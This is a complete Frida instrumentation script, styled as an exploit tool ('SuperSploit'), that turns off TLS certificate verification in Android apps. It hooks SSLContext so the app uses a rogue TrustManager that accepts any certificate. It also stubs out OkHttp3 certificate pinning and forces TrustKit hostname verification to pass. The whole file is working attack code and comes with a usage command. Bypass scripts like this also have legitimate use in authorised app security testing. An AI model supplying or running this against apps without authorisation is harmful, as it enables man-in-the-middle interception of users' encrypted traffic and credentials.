/*
 * SuperSploit Universal Android SSL Bypass (The Trust Shatterer)
 * Targets: Default X509TrustManager, OkHttp3, TrustKit
 * Usage: frida -U -f com.target.app -l frida_universal_ssl_bypass.js
 */

Java.perform(function() {
    console.log("[*] SuperSploit Frida Agent Injected.");
    console.log("[*] Initializing memory hooks for TLS verification bypass...");

    // 1. Bypass the default Android TrustManager
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        var TrustManager = Java.registerClass({
            name: 'com.supersploit.bypass.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {
                    console.log("[+] Intercepted checkServerTrusted(). Returning void (Bypass Success).");
                },
                getAcceptedIssuers: function() { return []; }
            }
        });

        // Hook SSLContext to use our rogue TrustManager
        var TrustManagers = [TrustManager.$new()];
        var SSLContext_init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
        SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
            console.log("[*] Overwriting App SSLContext with Rogue TrustManager.");
            SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
        };
    } catch (e) {
        console.log("[-] Standard TrustManager hook failed: " + e);
    }

    // 2. Bypass OkHttp3 Certificate Pinning
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("[+] Intercepted OkHttp3 CertificatePinner check() for host: " + hostname);
            return; // Simply return to bypass the pin verification
        };
    } catch (e) {
        console.log("[-] OkHttp3 CertificatePinner hook failed (App might not use it).");
    }

    // 3. Bypass TrustKit Certificate Pinning
    try {
        var TrustKitManager = Java.use('com.datatheorem.android.trustkit.pinning.OkHostnameVerifier');
        TrustKitManager.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function(hostname, session) {
            console.log("[+] Intercepted TrustKit HostnameVerifier for host: " + hostname);
            return true; // Force boolean return to true
        };
    } catch (e) {
        console.log("[-] TrustKit Pinning hook failed (App might not use it).");
    }

    console.log("[*] TLS verification boundaries have been shattered in memory.");
});